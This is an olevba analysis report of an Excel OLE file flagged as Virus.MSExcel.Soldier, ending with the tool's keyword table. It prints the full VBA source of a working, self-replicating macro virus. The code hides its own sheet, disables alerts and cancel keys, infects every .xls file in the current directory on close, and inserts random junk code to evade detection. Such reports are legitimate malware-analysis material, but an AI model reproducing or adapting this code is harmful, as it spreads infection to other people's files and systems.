olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Soldier-684449c71e35235bd5cf97a03b563f1c0293820b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO LOMHNMKQKDY.bas 
in file: Virus.MSExcel.Soldier-684449c71e35235bd5cf97a03b563f1c0293820b - OLE stream: '_VBA_PROJECT_CUR/VBA/LOMHNMKQKDY'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Function lcrdymnn()
Attribute lcrdymnn.VB_ProcData.VB_Invoke_Func = " \n14"
'SAv0h
End Function
Function yivkhdkutsws()
Attribute yivkhdkutsws.VB_ProcData.VB_Invoke_Func = " \n14"
'2%`r!^t@Nk&A1nt@&
Dim tusvek
End Function
'b4R8KEuY5qHPD&&(B8Aq
'75&\:168>a#&J

'XM/Soldier by Lord Natas [Codebreakers]
'Huge thanks to VicodinES
'Dedicated to all soldiers
'Who gave their lives
'To make ours better

Function Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    MenuBars(xlWorksheet).Menus("Format").MenuItems("S&heet").MenuItems("&Hide").Delete
    MenuBars(xlWorksheet).Menus("Format").MenuItems("S&heet").MenuItems("&Unhide...").Delete
End Function

Function Auto_Close()
Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    Application.ScreenUpdating = False
    Application.DisplayAlerts = False
    Application.EnableCancelKey = xlDisabled
    Randomize
    If Asc(UCase$(Left$(CurDir$(), 1))) < 67 Then GoTo e
    fn$ = Dir("*.xls")
    w$ = ActiveWorkbook.Name
    b = ActiveWorkbook.Saved
    Do While fn$ <> ""
        If UCase$(fn$) <> UCase$(ActiveWorkbook.Name) And Rnd() > 0.25 Then
            a = 0
            Workbooks.Open fn$
            If Workbooks(fn$).Modules.Count <> 0 Then GoTo c
            Randomize
            r$ = ""
            For i = 1 To Int(Rnd() * 15) + 2
                r$ = r$ + Chr$(Int(Rnd() * (90 - 65) + 65))
            Next
            Workbooks(w$).Sheets(1).Copy Before:=Workbooks(fn$).Sheets(1)
            Randomize
            If Rnd() < 0.5 Then
                Poly
                If Rnd() > Rnd() Then
                    Workbooks(fn$).Modules(1).InsertFile fileName:="c:\soldier.___", Merge:=True
                Else
                    Workbooks(fn$).Modules(1).InsertFile fileName:="c:\soldier.___"
                End If
                Kill "c:\soldier.___"
            End If
            Workbooks(fn$).Sheets(1).Name = r$
            Workbooks(fn$).Sheets(1).Visible = 0
            Workbooks(fn$).Save
c:
            Workbooks(fn$).Close
    End If
    fn$ = Dir()
    Loop
e:
    If ActiveWorkbook.Saved <> b Then ActiveWorkbook.Saved = b
    Randomize
    If Int(Rnd() * 75) = 25 Then
        Application.ScreenUpdating = True
        d$ = "Microsoft Excel"
        For i = 1 To 103
            d$ = " " & d$
            Application.Caption = d$
            Delay
        Next i
        For i = 103 To 1 Step -1
            d$ = Right$(d$, (Len(d$) - 1))
            Application.Caption = d$
            Delay
        Next
    End If
    Application.ScreenUpdating = True
    Application.DisplayAlerts = True
End Function

Function Delay()
Attribute Delay.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    For j = 1 To 40000
    Next j
End Function

Function Poly()
Attribute Poly.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    Randomize
    For k = 1 To Int(Rnd() * 5) + 1
        Open "c:\soldier.___" For Append As #1
        m = Int(Rnd() * 3)
        Randomize
        Select Case m
        Case 0
            aa$ = ""
            For y = 1 To Int(Rnd() * 15) + 2
                aa$ = aa$ + Chr$(Int(Rnd() * (122 - 97) + 97))
            Next y
            Print #1, "Function " & aa$ & "()"
            Randomize
            For y = 1 To Int(Rnd() * 6) + 1
                ab$ = ""
                Randomize
                If Rnd() > Rnd() Then
                    For z = 1 To Int(Rnd() * 24) + 1
                        ab$ = ab$ + Chr$(Int(Rnd() * (126 - 32) + 32))
                    Next z
                    Print #1, Chr$(39) & ab$
                Else
                    Randomize
                    For x = 1 To Int(Rnd() * 5) + 1
                        ab$ = ""
                        Randomize
                        For z = 1 To Int(Rnd() * 15) + 2
                            ab$ = ab$ + Chr$(Int(Rnd() * (122 - 97) + 97))
                        Next z
                        Print #1, "Dim " & ab$
                    Next x
                End If
            Next y
            Print #1, "End Function"
        Case 1
            Randomize
            For y = 1 To Int(Rnd() * 6) + 1
                ab$ = ""
                For z = 1 To Int(Rnd() * 30) + 1
                    ab$ = ab$ + Chr$(Int(Rnd() * (126 - 32) + 32))
                Next z
                Print #1, Chr$(39) & ab$
            Next y
        Case 2
            Randomize
            aa$ = ""
            For y = 1 To Int(Rnd() * 15) + 1
                aa$ = aa$ + Chr$(Int(Rnd() * (122 - 97) + 97))
            Next y
            Print #1, "Function " & aa$ & "()"
            Randomize
            For y = 1 To Int(Rnd() * 4) + 1
                ab$ = ""
                Randomize
                For z = 1 To Int(Rnd() * 15) + 1
                    ab$ = ab$ + Chr$(Int(Rnd() * (122 - 97) + 97))
                Next z
                Print #1, ab$ & " =" & Str$(Int(Rnd() * 30000) + 1)
            Next y
            Print #1, "End Function"
        End Select
        Close #1
    Next k
End Function
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     19 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  LOMHNMKQKD
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
+----------+--------------------+---------------------------------------------+

